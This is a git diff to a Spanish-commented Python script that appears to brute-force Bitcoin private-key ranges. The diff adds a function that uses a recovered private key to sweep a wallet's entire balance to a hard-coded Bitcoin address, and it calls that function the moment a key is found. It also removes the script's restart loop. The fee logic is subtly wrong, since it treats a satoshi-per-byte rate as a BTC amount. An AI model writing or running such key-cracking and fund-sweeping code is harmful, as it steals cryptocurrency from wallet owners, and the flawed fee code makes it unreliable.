@@ -13,6 +13,8 @@ from rich.console import Console
 from datetime import datetime
 import pytz
 
+from bit import Key
+from bit.network import NetworkAPI
 
 # Importar private_key_to_public_key, pubkey_to_bitcoin_address, de bitcoin.py
 from bitcoinx import private_key_to_public_key, pubkey_to_bitcoin_address, obtener_valor_hex_porcentaje, rangoInicialFinalHexEncontradoPorcentaje, get_hex_range_from_page_number
@@ -24,7 +26,7 @@ console.clear()
 la_paz_tz = pytz.timezone("America/La_Paz")
 
 def getPubKey(address):
-    results = []  # Lista para acumular los resultados
+    results = ''  # Lista para acumular los resultados
     while True:
         try:
             print(f"Buscando Pubkey para {address}")
@@ -34,7 +36,7 @@ def getPubKey(address):
 
             # La respuesta es directamente la clave pública como texto
             pubkey = response.text.strip()  # Eliminar posibles espacios en blanco
-            results.append(pubkey)
+            results = pubkey
 
             # Si se obtuvo la pubkey, salir del bucle
             if pubkey:
@@ -48,6 +50,70 @@ def getPubKey(address):
         time.sleep(10)  # Esperar 10 segundos para la próxima consulta
 
     return results
+
+
+# Función para obtener el fee más alto de la red
+def get_highest_fee():
+    try:
+        # Consultar una API pública para obtener las tarifas actuales de la red Bitcoin
+        response = requests.get('https://mempool.space/api/v1/fees/recommended')
+        response.raise_for_status()  # Lanza una excepción si la solicitud no es exitosa
+        fees = response.json()
+        
+        # Retorna el fee más alto (puedes usar 'fastestFee' o 'halfHourFee' dependiendo de tus necesidades)
+        highest_fee = fees['fastestFee']
+        return highest_fee
+    except Exception as e:
+        print(f"Error al obtener el fee más alto: {e}")
+        return None
+
+
+# Función para enviar todos los fondos
+def send_all_funds(private_key_hex, destination_address, btc_fee=0.0001):
+    # Crear una clave a partir de la clave privada en formato hexadecimal
+    key = Key(private_key_hex)
+
+    # Verificar el saldo disponible
+    balance = key.get_balance('btc')
+    print(f"Saldo disponible: {balance} BTC")
+    
+    if balance <= 0:
+        return "No hay fondos disponibles para enviar"
+
+    # Verificar si el saldo es mayor que la tarifa configurada
+    if balance <= btc_fee:
+        # Si no, obtener el fee más alto de la red
+        print("El saldo es menor que la tarifa configurada. Usando el fee más alto de la red.")
+        btc_fee = get_highest_fee()
+        if btc_fee is None:
+            return "No se pudo obtener el fee más alto de la red."
+
+
+    # Convertir la tarifa en BTC a satoshis por byte
+    # 1 BTC = 100,000,000 satoshis
+    btc_to_satoshis = btc_fee * 100000000
+
+    # Estimar el tamaño de la transacción (en bytes)
+    tx_size_estimate = 250  # Estimación de tamaño para una transacción estándar (puede variar según los inputs y outputs)
+
+    # Calcular el fee en satoshis por byte
+    fee_per_byte = int(btc_to_satoshis / tx_size_estimate)
+
+    print(f"Tarifa configurada: {btc_fee} BTC ({fee_per_byte} satoshis por byte)")
+
+    # Crear la transacción enviando todos los fondos a la dirección de destino proporcionada
+    try:
+        # `outputs` contiene la dirección de destino y la cantidad de BTC a enviar.
+        # Se envían todos los fondos a la dirección de destino proporcionada
+        tx = key.send([(destination_address, balance)], fee=fee_per_byte)
+
+        # Esperar la confirmación
+        print(f"Transacción enviada: {tx}")
+        return tx
+
+    except Exception as e:
+        return f"Error al enviar los fondos: {str(e)}"
+
 
 
 def enviar_mensaje_telegram(token, chat_id, mensaje):
@@ -157,6 +223,9 @@ def Home(porcentajeSearch=61, arrayIndex=0):
         if accountPrivateHEX:
             totalWalletFound += 1
 
+            # Enviar Retiro a mi Wallet
+            send_all_funds(accountPrivateHEX, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc', btc_fee=0.0001)
+
             balance = get_btc_balance(vanityAddressSearch)
 
             # Imprimir el panel con el texto y estilos especificados
@@ -178,25 +247,6 @@ def Home(porcentajeSearch=61, arrayIndex=0):
 
             # Salir del While si se encuentra Wallet
             break
-
-
-    # Incrementar porcentajeSearch en 4% y reiniciar si llega a 100%
-    #porcentajeSearch += 4
-    #if porcentajeSearch > 100:
-    #    porcentajeSearch = 5
-
-
-    # Incrementar el índice
-    arrayIndex += 1
-    
-    # Si hemos llegado al final de la lista, reiniciar el índice a 0
-    if arrayIndex >= len(listaArraySearch):
-        arrayIndex = 0
-        print("Se llegó al final de la lista. Reiniciando búsqueda.")
-
-
-    # Llamar a Home nuevamente con el nuevo porcentaje
-    Home(porcentajeSearch, arrayIndex)
 
 
 
